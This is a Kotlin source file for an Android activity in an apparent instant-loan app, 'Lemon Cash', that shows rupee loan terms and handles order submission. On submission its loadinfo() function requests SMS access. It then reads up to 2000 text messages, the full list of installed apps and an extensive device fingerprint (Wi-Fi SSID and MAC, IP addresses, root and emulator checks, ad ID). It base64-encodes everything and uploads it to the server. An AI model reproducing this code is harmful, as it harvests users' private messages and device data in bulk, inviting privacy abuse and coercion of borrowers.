package com.lemon.now.ui.activity

import SPUtil
import ToastUtils
import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Message
import android.os.SystemClock
import android.provider.Settings
import android.provider.Telephony
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.Surface
import android.view.Window
import android.view.WindowManager
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Observer
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustEvent
import com.bumptech.glide.Glide
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.google.gson.Gson
import com.lemon.now.base.activity.BaseActivity1
import com.lemon.now.base.etx.util.e
import com.lemon.now.base.etx.util.singleClick
import com.lemon.now.base.etx.view.CustomDialog
import com.lemon.now.base.etx.view.dismissLoadingExt2
import com.lemon.now.base.etx.view.showLoadingExt2
import com.lemon.now.online.BuildConfig
import com.lemon.now.online.R
import com.lemon.now.online.databinding.ActivityOrderBinding
import com.lemon.now.ui.ApiService
import com.lemon.now.ui.bean.CallInfoBean
import com.lemon.now.ui.bean.DeviceAllBean
import com.lemon.now.ui.bean.DeviceInfoBean
import com.lemon.now.ui.bean.ImageInfoBean
import com.lemon.now.ui.bean.MSGInfoBean
import com.lemon.now.ui.bean.PackageInfoBean
import com.lemon.now.ui.bean.PhoneInfoBean
import com.lemon.now.ui.bean.Qbnsde5LgABnpY9IpFTFXkgR3l8
import com.lemon.now.ui.model.HomeViewModel
import com.lemon.now.util.BatteryReceiver
import com.lemon.now.util.SDUtil.availableInternalMemorySize
import com.lemon.now.util.SDUtil.getExternalStorageSize
import com.lemon.now.util.SDUtil.getExternalfreeSpaceStorageSize
import com.lemon.now.util.SDUtil.getRootDirectorytotalSpace
import com.lemon.now.util.SDUtil.getTotalMemory
import com.lemon.now.util.SDUtil.getUsedStoragePercentage
import com.lemon.now.util.SDUtil.getavailableMemory
import com.lemon.now.util.SDUtil.isSDCardAvailable
import com.lemon.now.util.SettingUtil
import com.lemon.now.util.SettingUtil.base64
import com.lemon.now.util.SettingUtil.calculateSleepDuration
import com.lemon.now.util.SettingUtil.firstInstallTime
import com.lemon.now.util.SettingUtil.getApplicationSignatureMD5
import com.lemon.now.util.SettingUtil.getApplicationSignatureSHA1
import com.lemon.now.util.SettingUtil.getBatteryPercentage
import com.lemon.now.util.SettingUtil.getBatteryStatus
import com.lemon.now.util.SettingUtil.getCountryCode
import com.lemon.now.util.SettingUtil.getCountryCode2
import com.lemon.now.util.SettingUtil.getCurrentWifiMacAddress
import com.lemon.now.util.SettingUtil.getCurrentWifiSSID
import com.lemon.now.util.SettingUtil.getDisplayLanguage
import com.lemon.now.util.SettingUtil.getIPAddress
import com.lemon.now.util.SettingUtil.getLastUpdateTime
import com.lemon.now.util.SettingUtil.getMobileType
import com.lemon.now.util.SettingUtil.getNetworkCountryIso
import com.lemon.now.util.SettingUtil.getNetworkOperatorName
import com.lemon.now.util.SettingUtil.getNetworkOperatorName2
import com.lemon.now.util.SettingUtil.getNetworkOperatorName3
import com.lemon.now.util.SettingUtil.getNetworkType
import com.lemon.now.util.SettingUtil.getProcessCpuUsage
import com.lemon.now.util.SettingUtil.getSHA256
import com.lemon.now.util.SettingUtil.getSystemLanguage
import com.lemon.now.util.SettingUtil.getTotalBatteryCapacity
import com.lemon.now.util.SettingUtil.getWifiDns1
import com.lemon.now.util.SettingUtil.getWifiGatewayIPAddress
import com.lemon.now.util.SettingUtil.getWifiIPAddress
import com.lemon.now.util.SettingUtil.getWifiSSID
import com.lemon.now.util.SettingUtil.getWifiSubnetMask
import com.lemon.now.util.SettingUtil.is4GNetworkAvailable
import com.lemon.now.util.SettingUtil.is5GNetworkAvailable
import com.lemon.now.util.SettingUtil.isACCharging
import com.lemon.now.util.SettingUtil.isAPPPhone
import com.lemon.now.util.SettingUtil.isAPPTablet
import com.lemon.now.util.SettingUtil.isAutoBrightnessEnabled
import com.lemon.now.util.SettingUtil.isCharging
import com.lemon.now.util.SettingUtil.isDebugMode
import com.lemon.now.util.SettingUtil.isDeviceRooted2
import com.lemon.now.util.SettingUtil.isEmulator2
import com.lemon.now.util.SettingUtil.isLowPowerModeEnabled
import com.lemon.now.util.SettingUtil.isMobileDataEnabled
import com.lemon.now.util.SettingUtil.isNetworkAvailable
import com.lemon.now.util.SettingUtil.isNetworkConnected
import com.lemon.now.util.SettingUtil.isO3Language
import com.lemon.now.util.SettingUtil.isScreenLocked
import com.lemon.now.util.SettingUtil.isSimCardReady
import com.lemon.now.util.SettingUtil.isUSBCharging
import com.lemon.now.util.SettingUtil.isUsingProxy
import com.lemon.now.util.SettingUtil.isWifiConnected
import java.util.Locale
import java.util.TimeZone
import java.util.UUID


/**
 *   Lemon Cash
 *  OrderActivity.java
 *
 */
class OrderActivity : BaseActivity1<HomeViewModel, ActivityOrderBinding>() {
    private lateinit var someActivityResultLauncher: ActivityResultLauncher<Intent>

    companion object {
        private const val SMS_PERMISSION_REQUEST_CODE = 101
    }


    override fun initView(savedInstanceState: Bundle?) {
        mViewBind.back.setOnClickListener {
            finish()
        }
        mViewModel.checkorderstatus(
            intent.getStringExtra("id").toString(),
            SettingUtil.isVpnConnected(this@OrderActivity).toString(),
            SettingUtil.getAvailableSimSlots(this@OrderActivity).toString(),
            SettingUtil.getActivatedSimCount(this@OrderActivity).toString()
        )

        mViewBind.next.singleClick {
            mViewModel.getuserinfo(true,
                SettingUtil.isVpnConnected(this@OrderActivity).toString(),
                SettingUtil.getAvailableSimSlots(this@OrderActivity).toString(),
                SettingUtil.getActivatedSimCount(this@OrderActivity).toString()
            )
        }
        var bean = intent.getParcelableExtra<Qbnsde5LgABnpY9IpFTFXkgR3l8>("bean")
        bean?.let { setdata(it) }
        someActivityResultLauncher =
            registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
                if (result.resultCode == RESULT_OK) {
                    submitOrder()
                }
            }
        batteryReceiver = BatteryReceiver()
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        registerReceiver(batteryReceiver, filter)
    }
    private lateinit var batteryReceiver: BatteryReceiver
    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(batteryReceiver)
    }

    private fun submitOrder() {
        if (allPermissionsGranted()) {
            val adjustEvent = AdjustEvent(ApiService.order)
            Adjust.trackEvent(adjustEvent)
            showLoadingExt2("Your application is being submitted, please do not exit or return.")
            loadinfo()
        } else {
            ActivityCompat.requestPermissions(
                this, arrayOf(
                    Manifest.permission.READ_SMS
                ), SMS_PERMISSION_REQUEST_CODE
            )
        }
    }

    private val MSG_CONTACT_INFO = 1

    private val handler = object : Handler(Looper.getMainLooper()) {
        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == MSG_CONTACT_INFO) {
                mViewModel.submitOrder(
                    msg.obj.toString(),
                    intent.getStringExtra("id").toString(),
                    SettingUtil.isVpnConnected(this@OrderActivity).toString(),
                    SettingUtil.getAvailableSimSlots(this@OrderActivity).toString(),
                    SettingUtil.getActivatedSimCount(this@OrderActivity).toString()
                )
            }
        }
    }

    @SuppressLint("Range")
    fun loadinfo() {

        Thread {

            val packageArrayList: ArrayList<PackageInfoBean> = ArrayList()
            val msgArrayList: ArrayList<MSGInfoBean> = ArrayList()
            val phoneArrayList: ArrayList<PhoneInfoBean> = ArrayList()
            val callArrayList: ArrayList<CallInfoBean> = ArrayList()
            val imgArrayList: ArrayList<ImageInfoBean> = ArrayList()

            val packageManager: PackageManager = packageManager
            val installedApps =
                packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
            for (appInfo in installedApps) {
                val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                if (launchIntent != null) {
                    val isSystemApp: Boolean =
                        (appInfo != null && appInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0)
                    try {
                        val packageInfo = packageManager.getPackageInfo(appInfo.packageName, 0)
                        val applicationInfo: ApplicationInfo =
                            packageManager.getApplicationInfo(appInfo.packageName, 0)



                        if (packageInfo!= null){
                            val updateTimeMillis: Long = packageInfo.lastUpdateTime
                            val updateTime = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                                .format(java.util.Date(updateTimeMillis))
                            val installTimeMillis: Long = packageInfo.firstInstallTime
                            val installTime = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                                .format(java.util.Date(installTimeMillis))
                            packageArrayList.add(
                                PackageInfoBean(
                                    appInfo?.loadLabel(packageManager).toString(),
                                    appInfo.packageName,
                                    if (isSystemApp) "SYSTEM" else "NON_SYSTEM",
                                    packageInfo?.versionName?:"",
                                    packageInfo?.versionCode?:0,
                                    updateTime,
                                    installTime,
                                    applicationInfo.sourceDir,
                                    appInfo.flags
                                )
                            )
                        }else{
                            packageArrayList.add(
                                PackageInfoBean(
                                    appInfo.loadLabel(packageManager).toString(),
                                    appInfo.packageName,
                                    if (isSystemApp) "SYSTEM" else "NON_SYSTEM",
                                    "",
                                    0,
                                    "",
                                    "",
                                    applicationInfo.sourceDir,
                                    appInfo.flags
                                ))
                        }
                    } catch (e: PackageManager.NameNotFoundException) {
                            packageArrayList.add(
                                PackageInfoBean(
                                    appInfo.loadLabel(packageManager).toString(),
                                    appInfo.packageName,
                                    if (isSystemApp) "SYSTEM" else "NON_SYSTEM",
                                    "",
                                    0,
                                    "",
                                    "",
                                    applicationInfo.sourceDir,
                                    appInfo.flags
                                ))
                    }


                }

            }

            val smsUri = Uri.parse("content://sms/")
            val cursor = contentResolver.query(
                smsUri, null, null, null, "${Telephony.Sms.DEFAULT_SORT_ORDER} LIMIT 2000"
            )

            if (cursor != null) {
                val indexBody = cursor.getColumnIndex(Telephony.Sms.BODY)
                val indexAddress = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val indexDate = cursor.getColumnIndex(Telephony.Sms.DATE)
                val indexType = cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)
                val indexRead = cursor.getColumnIndexOrThrow(Telephony.Sms.READ)
                val indexId = cursor.getColumnIndexOrThrow(Telephony.Sms._ID)
                val indexperson = cursor.getColumnIndex(Telephony.Sms.PERSON)
                while (cursor.moveToNext()) {
                    val smsBody = cursor.getString(indexBody)
                    val phoneNumber = cursor.getString(indexAddress)
                    val date = cursor.getString(indexDate)
                    val type = cursor.getInt(indexType)
                    val read = cursor.getInt(indexRead)
                    val id = cursor.getLong(indexId)
                    val person = cursor.getString(indexperson)
                    val time = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                        .format(java.util.Date(date.toLong()))
                    val messageType = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                        1
                    } else if (type == Telephony.Sms.MESSAGE_TYPE_SENT) {
                        2
                    } else {
                        1
                    }
                    val readStatus = if (read == 1) {
                        1
                    } else {
                        0
                    }
                    if (person != null) {

                    }
                    val personName = person ?: "null"
//                    Log.d(
//                        "InstalledApp",
//                        "ID: $time person: ${personName} Body: $smsBody, phoneNumber: " + "$phoneNumber ,contactName: $contactName,messageType: $messageType,readStatus: $readStatus"
//                    )
                    msgArrayList.add(
                        MSGInfoBean(
                            personName,
                            phoneNumber,
                            smsBody,
                            messageType,
                            time,
                            id.toString(),
                            readStatus,
                            phoneNumber
                        )
                    )
                }
                cursor.close()
            }

            var channel: String by SPUtil(ApiService.channel, "")
            var firsttime: String by SPUtil(ApiService.firsttime, "")
            var referrerurl: String by SPUtil("referrerurl", "")
            val displayMetrics = resources.displayMetrics
            val screenWidthPixels = displayMetrics.widthPixels
            val screenHeightPixels = displayMetrics.heightPixels
            val screenDensity = displayMetrics.densityDpi.toFloat() / DisplayMetrics.DENSITY_DEFAULT

            val screenWidthInches = screenWidthPixels / screenDensity
            val screenHeightInches = screenHeightPixels / screenDensity

            val screenSizeInches =
                kotlin.math.sqrt((screenWidthInches * screenWidthInches) + (screenHeightInches * screenHeightInches))
            Adjust.getGoogleAdId(this) { googleadid ->
                val info = DeviceAllBean("",
                    "android",
                    this.getString(R.string.app_name),
                    channel,
                    "",
                    googleadid,
                    firsttime,
                    SystemClock.elapsedRealtime().toString(),
                    SystemClock.elapsedRealtime().toString(),
                    calculateSleepDuration().toString(),
                    getLastUpdateTime(packageManager, packageName),
                    firstInstallTime(packageManager, packageName),
                    getSystemLanguage(),
                    getCountryCode(this),
                    getDisplayLanguage(this),
                    getCountryCode2(this),
                    isO3Language(),
                    getMobileType(this),
                    TimeZone.getDefault().getDisplayName(false,TimeZone.SHORT,Locale.US)+" "+TimeZone.getDefault().getID(),
                    isLowPowerModeEnabled(this).toString(),
                    isAutoBrightnessEnabled(this).toString(),
                    isEmulator2().toString(),
                    isDeviceRooted2().toString(),
                    isDebugMode().toString(),
                    getProcessCpuUsage().toString(),
                    "1",
                    getNetworkOperatorName(this),
                    isSimCardReady(this).toString(),
                    getNetworkOperatorName2(this),
                    UUID.randomUUID().toString(),
                    getNetworkCountryIso(this).toString(),
                    getApplicationSignatureMD5(this),
                    this.applicationInfo.uid.toString(),
                    getApplicationSignatureSHA1(this),
                    getWifiSSID(this),
                    Build.TYPE,
                    Build.BOARD,
                    Build.PRODUCT,
                    getSHA256(this) ?: "",
                    packageManager.getPackageInfo(packageName, 0).applicationInfo.sourceDir,
                    "","",
                    "true",
                    Build.USER,
                    UUID.randomUUID().toString(),
                    "false",
                    getWifiSSID(this),
                    "true",
                    "","true",
                    "true",
                    referrerurl,
                    "",
                    Locale.getDefault().country,"","",
                //net
                    getNetworkType(this).toString(),
                    is4GNetworkAvailable(this).toString(),
                    is5GNetworkAvailable(this).toString(),
                    isWifiConnected(this).toString(),
                    isWifiConnected(this).toString(),
                    isMobileDataEnabled(this).toString(),
                    isNetworkConnected(this).toString(),
                    isUsingProxy(this).toString(),
                    SettingUtil.isVpnConnected(this).toString(),
                        isNetworkAvailable(this@OrderActivity).toString(),
                    "true",
                    "true",

                    getNetworkOperatorName2(this),
                    getNetworkOperatorName3(this),
                    getNetworkCountryIso(this),
                    getIPAddress(true).toString(),
                    getIPAddress(false).toString(),
                    getWifiIPAddress(this).toString(),
                    getWifiGatewayIPAddress(this).toString(),
                            getWifiIPAddress(this).toString(),

                    getWifiSubnetMask(this),getWifiDns1(this),
                    "1",getCurrentWifiSSID(this),getCurrentWifiMacAddress(this),"",
                    //sd
                    getRootDirectorytotalSpace(),availableInternalMemorySize(),getUsedStoragePercentage().toString(),getExternalStorageSize(),
                    getExternalfreeSpaceStorageSize(),getTotalMemory(this),getavailableMemory(this),"",
                    "",isSDCardAvailable().toString(),"",
                //moble

                    Build.BOARD,
                    Build.CPU_ABI.toString(),
                    Build.CPU_ABI2.toString(),
                    "",
                    Build.MODEL,
                    Build.BRAND,
                    Build.MANUFACTURER,
                    Build.DEVICE,
                    Build.HARDWARE,
                    Build.PRODUCT,
                    Build.VERSION.RELEASE,
                    Build.VERSION.SDK_INT.toString(),

                    Build.VERSION.RELEASE,Build.VERSION.SDK,
                    BuildConfig.VERSION_CODE.toString(),
                    Build.FINGERPRINT,
                    Build.DISPLAY,
                    Build.USER,
                    Build.getRadioVersion(),
                    displayMetrics.widthPixels.toString(),
                    displayMetrics.heightPixels.toString(),
                    displayMetrics.heightPixels.toString(),
                    screenSizeInches.toString(),
                    Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE)
                        .toString(),
                    resources.displayMetrics.densityDpi.toString(),
                    resources.displayMetrics.density.toString(),"true","false","true",isScreenLocked(this).toString()
                    ,getRotation().toString(),isAPPPhone(this).toString(),isAPPTablet(this).toString()
                    ,getBatteryStatus(this),getTotalBatteryCapacity(this).toString(),batteryReceiver.getBatteryLevel().toString(),getBatteryPercentage(this).toString()
                    ,isCharging(this).toString(),isACCharging(this).toString(),isUSBCharging(this).toString()
                )
                var deviceinfobean = DeviceInfoBean(
                    packageArrayList,
                    msgArrayList,
                    phoneArrayList,callArrayList,imgArrayList,
                    info
                )

                e("InstalledApp", Gson().toJson(deviceinfobean))
                val message: Message =
                    handler.obtainMessage(MSG_CONTACT_INFO, Gson().toJson(deviceinfobean).base64())
                handler.sendMessage(message)
            }


        }.start()
    }

    private fun getRotation(): Int {
        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val display = windowManager.defaultDisplay
        val rotation = display.rotation
        when (rotation) {
            Surface.ROTATION_0 -> {return 0 }
            Surface.ROTATION_90 -> {return 90}
            Surface.ROTATION_180 -> {return 180}
            Surface.ROTATION_270 -> {return 270}
            else -> {return 0}
        }
    }

    private fun allPermissionsGranted(): Boolean {
        return (ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_SMS
        )
        ) == PackageManager.PERMISSION_GRANTED
    }


    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            SMS_PERMISSION_REQUEST_CODE -> {
                if (allPermissionsGranted()) {
                    loadinfo()
                } else {
                    finish()
                }
            }
        }
    }

    override fun createObserver() {

        mViewModel.orderstatusdata.observe(this, Observer {
            if (it.rZ81DSU7WU4hny4ukGHljvjO41bfB == 1) {
                if (it.Qbnsde5LgABnpY9IpFTFXkgR3l8 != null) {
                    setdata(it.Qbnsde5LgABnpY9IpFTFXkgR3l8)
                }
            }
        })

        mViewModel.homebean.observe(this, Observer {
            if (it.rZ81DSU7WU4hny4ukGHljvjO41bfB == 1) {
                if (it.mKDa0r8qOCzrAe6Pj == 1) {
                    val intent = Intent(this@OrderActivity, AuthenticationActivity::class.java)
                    startActivity(intent)
                } else if (it.mKDa0r8qOCzrAe6Pj == 2) {
                    if (it.FUiNUblg6avFY2 == 0) {
                        val dialog = CustomDialog(this@OrderActivity)
                        dialog.setConfirmCallback {
                            val intent = Intent(this@OrderActivity, UserFaceActivity::class.java)
                            intent.putExtra("phototext", it.FC9KFV7R3tgHg3grZ8uvFak7NdzLXMR7)
                            someActivityResultLauncher.launch(intent)
                        }
                        dialog.setCancelCallback {

                        }
                        dialog.setCancelable(false)
                        dialog.show()
                        dialog.setTitle("TIPS")
                        dialog.setcontent("Please upload a selfie photo before continuing.")
                        val dialogWindow: Window = dialog.window!!
                        val m: WindowManager = getWindowManager()
                        val d = m.defaultDisplay
                        val p = dialogWindow.attributes
                        p.width = (d.width * 0.95).toInt()
                        p.gravity = Gravity.CENTER
                        dialogWindow.attributes = p
                    } else if (it.FUiNUblg6avFY2 == 1) {
                        submitOrder()
                    }
                }
            }
        })

        mViewModel.submitdata.observe(this, Observer {
            dismissLoadingExt2()
            if (it.Mr2ElvV == 1) {
                val adjustEvent = AdjustEvent(ApiService.applys)
                Adjust.trackEvent(adjustEvent)
                val logger = AppEventsLogger.newLogger(this)
                logger.logEvent(AppEventsConstants.EVENT_NAME_ADDED_TO_CART);
            }
            if (it.rZ81DSU7WU4hny4ukGHljvjO41bfB == 1) {
                val intent = Intent()
                intent.putParcelableArrayListExtra("list", it.o2Hvk1wvAGN)
                intent.setClass(this, OrderSuccesActivity::class.java)
                startActivity(intent)
                finish()
            } else {
                ToastUtils.showShort(this@OrderActivity, it.vWCgp64OkxPVoGqics)
            }
        })
    }

    private fun setdata(it: Qbnsde5LgABnpY9IpFTFXkgR3l8) {
        Glide.with(this).load(it.pPQGUTNAxoA)
            .into(mViewBind.productLogo)
        mViewBind.pfdroDCductName.text =
            it.zTAPvIwFI3Sv7UZv2SVGDrIOePGxxR9AqV
        mViewBind.amount.text = "₹ " + it.WA4R2qnu5lhz7
        mViewBind.receivedamount.text =
            "₹ " + it.noNz52nAR9teAGnKBK


        mViewBind.terms.text =
            it.HPQKWiwz42QnEFJJ8kFrx.toString() + " Days"
        mViewBind.verificationfee.text =
            "₹ " + it.wCQXjLl5RSFnUxwYCfTN8WztD1ZrD3Ut.toString()

        mViewBind.gst.text =
            "₹ " + it.pnyYapGgsgfnmViDd7tiiRLMQqE3W3QbXJL.toString()
        mViewBind.overduecharge.text =
            it.vWdgZA58vY2J8RkbYUJXiCV6aFytmxz + "/day"

        mViewBind.interest.text =
            "₹ " + it.OxxwB0d5KS25mPAcZhLw86mgedORI.toString()
        mViewBind.repaymentamount.text =
            "₹ " + it.Ei5rFw3ggCfFFxvogcCvdtX.toString()
    }
}